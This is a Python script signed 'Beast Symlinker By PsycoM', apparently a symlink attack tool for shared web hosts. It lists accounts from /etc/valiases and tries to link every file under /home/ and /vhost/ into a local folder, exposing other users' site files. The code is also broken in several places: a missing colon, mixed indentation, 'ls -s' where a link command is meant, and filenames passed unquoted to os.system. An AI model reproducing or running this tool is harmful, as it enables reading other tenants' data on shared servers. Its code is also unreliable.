import os
import subprocess
def GetReady():
    try:
		os.mkdir('SymlinkedSites')
	except:
		pass
def SitesAlias(User):
	try:
		os.mkdir(User)
	except:
		pass
def PsycoSymlinker():
	cwd = os.getcwd()
	if os.path.isdir('/home/')==True:
		Users = subprocess.check_output(['ls','-la','/etc/valiases'])
		for User in Users:
			SitesAlias(User)
			for Dir,SubDir,Files in os.walk('/home/'):
				for __File__ in Files:
					__File__ = str(__File__)
					File = f'{Dir}/{__File__}'
					os.system(f'ls -s {File} {cwd}/SymlinkedSites/{User}/{File}')
	if os.path.isdir('/vhost/')==True:
		Users = subprocess.check_output(['ls','-la','/etc/valiases'])
		for User in Users:
			SitesAlias(User)
			for Dir,SubDir,Files in os.walk('/vhost/'):
				for __File__ in Files:
					__File__ = str(__File__)
					File = f'{Dir}/{__File__}'
					os.system(f'ls -s {File} {cwd}/SymlinkedSites/{User}/{File}')
	if os.path.isdir('/home/')==True and os.path.isdir('/vhost/')==True:
		Users = subprocess.check_output(['ls','-la','/etc/valiases'])
		for User in Users:
			SitesAlias(User)
			for Dir,SubDir,Files in os.walk('/home/'):
				for __File__ in Files:
					__File__ = str(__File__)
					File = f'{Dir}/{__File__}'
					os.system(f'ls -s {File} {cwd}/SymlinkedSites/{User}/{File}')
			for Dir,SubDir,Files in os.walk('/vhost/'):
				for __File__ in Files:
					__File__ = str(__File__)
					File = f'{Dir}/{__File__}'
					os.system(f'ls -s {File} {cwd}/SymlinkedSites/{User}/{File}')
if __name__=="__main__"
	#Made By PsycoM
	PsycoSymlinker()
	print('Finished Symlinking')
	print('\nBeast Symlinker By PsycoM')
	
